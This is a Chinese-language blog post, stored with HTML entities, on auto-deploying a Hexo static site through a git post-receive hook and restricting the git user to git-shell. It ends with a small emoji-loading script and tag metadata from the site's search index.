Hook&#x628A;Hexo&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;web&#x8D44;&#x6E90;&#x81EA;&#x52A8;&#x90E8;&#x7F72;&#x5230;web&#x76EE;&#x5F55;&#x4E0B;vim /home/git/hooks/post-receive&#x5728;DeployPath=&#x201D;&#x201D;&#x4E2D;&#x586B;&#x5165;&#x4F60;&#x7684;web&#x76EE;&#x5F55; #!/bin/bash #author: @illgo #author blog: http://www.illgo.cn/ #&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x8FDC;&#x7AEF;&#x4ED3;&#x5E93; IS_BARE=$(git rev-parse --is-bare-repository) if [ -z &quot;$IS_BARE&quot; ]; then echo &gt;&amp;2 &quot;fatal: post-receive: IS_NOT_BARE&quot; exit 1 fi unset GIT_DIR DeployPath=&quot;/var/www/html/&quot; echo &quot;===============================================&quot; cd $DeployPath echo &quot;deploying the myblog web&quot; #git stash #git pull origin master git fetch --all git reset --hard origin/master time=`date` echo &quot;web server pull at webserver at time: $time.&quot; echo &quot;================================================&quot; &#x914D;&#x7F6E;Git&#x90E8;&#x7F72;&#x56DE;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5207;&#x6362;&#x5230;&#x4F60;&#x751F;&#x6210;&#x7684;hexo&#x7AD9;&#x70B9;&#x76EE;&#x5F55;cd blognpm install hexo-deployer-git&#x5B89;&#x88C5;hexo&#x7684;Git&#x90E8;&#x7F72;&#x4F9D;&#x8D56;&#x5305; &#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;_config.yml, &#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;type: git repo: git@your-ip:/home/git/blog.git hexo clean &amp;&amp; hexo g &amp;&amp; hexo d &#x6700;&#x540E;&#x51FA;&#x4E8E;&#x5B89;&#x5168;&#x8003;&#x8651;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;git&#x7528;&#x6237;&#x6743;&#x9650;,&#x7981;&#x6B62;shell&#x767B;&#x5F55; &#x627E;&#x5230;git&#x7528;&#x6237;&#x4FE1;&#x606F;vim /etc/passwd git:x:502:502::/home/git:/bin/bash ## &#x6539;&#x4E3A; git:x:502:502::/home/git:/usr/local/git/bin/git-shell document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"默认","slug":"默认","permalink":"https://marnm.github.io/tags/默认/"}]}]